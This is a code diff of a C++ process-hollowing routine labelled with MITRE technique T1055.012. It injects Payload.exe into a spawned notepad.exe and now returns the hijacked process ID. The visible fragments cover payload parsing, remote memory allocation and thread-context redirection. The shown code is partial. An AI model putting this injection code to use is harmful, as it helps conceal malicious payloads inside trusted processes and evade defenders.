@@ -64,7 +64,7 @@ static std::vector<BYTE> ReadFileToBuffer(const std::wstring& filePath)
 // Process Hollowing Attack (T1055.012)
 // Full PE-based implementation: maps Payload.exe into notepad.exe
 // ============================================================
-bool PerformProcessHollowing()
+DWORD PerformProcessHollowing()
 {
     HANDLE hProcess = nullptr;
     HANDLE hThread = nullptr;
@@ -98,7 +98,7 @@ bool PerformProcessHollowing()
         {
             LogActivity("[ERROR] Failed to read Payload.exe!");
             LogActivity("[ERROR] Ensure Payload.exe is in the same folder as this executable.");
-            return false;
+            return 0;
         }
 
         LogActivity("[SUCCESS] Payload read: " + std::to_string(payloadData.size()) + " bytes");
@@ -115,14 +115,14 @@ bool PerformProcessHollowing()
         if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
         {
             LogActivity("[ERROR] Invalid DOS signature in Payload.exe!");
-            return false;
+            return 0;
         }
 
         PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pPayload + pDosHeader->e_lfanew);
         if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
         {
             LogActivity("[ERROR] Invalid NT signature in Payload.exe!");
-            return false;
+            return 0;
         }
 
         DWORD payloadImageBase = (DWORD)(DWORD_PTR)pNtHeaders->OptionalHeader.ImageBase;
@@ -182,7 +182,7 @@ bool PerformProcessHollowing()
         if (!created)
         {
             LogActivity("[ERROR] CreateProcessW failed. Error: " + std::to_string(GetLastError()));
-            return false;
+            return 0;
         }
 
         hProcess = pi.hProcess;
@@ -209,7 +209,7 @@ bool PerformProcessHollowing()
             LogActivity("[ERROR] NtQueryInformationProcess failed.");
             TerminateProcess(hProcess, 0);
             CloseHandle(hThread); CloseHandle(hProcess);
-            return false;
+            return 0;
         }
 
         PVOID pebAddress = pbi.PebBaseAddress;
@@ -274,7 +274,7 @@ bool PerformProcessHollowing()
             LogActivity("[ERROR] VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
             TerminateProcess(hProcess, 0);
             CloseHandle(hThread); CloseHandle(hProcess);
-            return false;
+            return 0;
         }
 
         {
@@ -422,7 +422,7 @@ bool PerformProcessHollowing()
             LogActivity("[ERROR] GetThreadContext failed.");
             TerminateProcess(hProcess, 0);
             CloseHandle(hThread); CloseHandle(hProcess);
-            return false;
+            return 0;
         }
 
         DWORD_PTR newEntryPoint = (DWORD_PTR)remoteBase + payloadEntryRVA;
@@ -438,7 +438,7 @@ bool PerformProcessHollowing()
             LogActivity("[ERROR] SetThreadContext failed.");
             TerminateProcess(hProcess, 0);
             CloseHandle(hThread); CloseHandle(hProcess);
-            return false;
+            return 0;
         }
 
         {
@@ -464,7 +464,7 @@ bool PerformProcessHollowing()
             LogActivity("[ERROR] ResumeThread failed.");
             TerminateProcess(hProcess, 0);
             CloseHandle(hThread); CloseHandle(hProcess);
-            return false;
+            return 0;
         }
 
         LogActivity("[SUCCESS] Thread resumed!");
@@ -482,7 +482,7 @@ bool PerformProcessHollowing()
         CloseHandle(hThread);
         CloseHandle(hProcess);
 
-        return true;
+        return pi.dwProcessId;
     }
     catch (...)
     {
@@ -493,6 +493,6 @@ bool PerformProcessHollowing()
             CloseHandle(hProcess);
         }
         if (hThread) CloseHandle(hThread);
-        return false;
+        return 0;
     }
 }
